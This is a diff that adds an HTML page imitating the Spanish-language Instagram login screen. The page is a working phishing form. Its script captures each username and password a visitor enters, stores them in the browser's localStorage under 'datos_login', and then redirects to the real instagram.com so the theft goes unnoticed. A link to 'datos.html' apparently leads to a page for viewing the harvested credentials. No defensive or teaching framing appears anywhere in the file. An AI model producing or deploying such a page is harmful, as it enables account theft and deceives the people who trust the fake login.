@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram</title>
+    <link rel="stylesheet" href="login_insta.css" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Billabong&display=swap"
+      rel="stylesheet"
+    />
+  </head>
+  <body>
+    <div class="container">
+      <div class="logo">
+        <img src="insta.png" alt="Logo Instagram" class="logo-img">
+      </div>
+      
+      <form id="loginForm">
+        <input
+          type="text"
+          id="usuario"
+          placeholder="Teléfono, usuario o correo electrónico"
+          required
+        />
+        <input
+          type="password"
+          id="contrasena"
+          placeholder="Contraseña"
+          required
+        />
+        <button type="submit" class="login-button">Entrar</button>
+      </form>
+
+      <div class="divider"><span>o</span></div>
+
+      <button class="facebook-button">
+        <img
+          src="https://cdn-icons-png.flaticon.com/512/124/124010.png"
+          alt="Facebook"
+          width="20"
+        />
+        Iniciar sesión con Facebook
+      </button>
+
+      <p class="forgot">¿Has olvidado la contraseña?</p>
+
+      <div class="signup">
+        ¿No tienes una cuenta? <a href="#">Regístrate</a>
+      </div>
+      <div class="signup">
+        ¿<a href="datos.html">?</a>
+      </div>
+
+
+
+    <script>
+ const form = document.getElementById('loginForm');
+
+form.addEventListener('submit', function(e) {
+  e.preventDefault();
+
+  const usuario = document.getElementById('usuario').value;
+  const contrasena = document.getElementById('contrasena').value;
+
+  const datos = { usuario, contrasena };
+
+  const datosGuardados = JSON.parse(localStorage.getItem('datos_login')) || [];
+  datosGuardados.push(datos);
+
+  localStorage.setItem('datos_login', JSON.stringify(datosGuardados));
+
+  // Redirigir después de guardar
+  window.location.href = 'https://www.instagram.com';
+});
+
+    </script>
+  </body>
+</html>
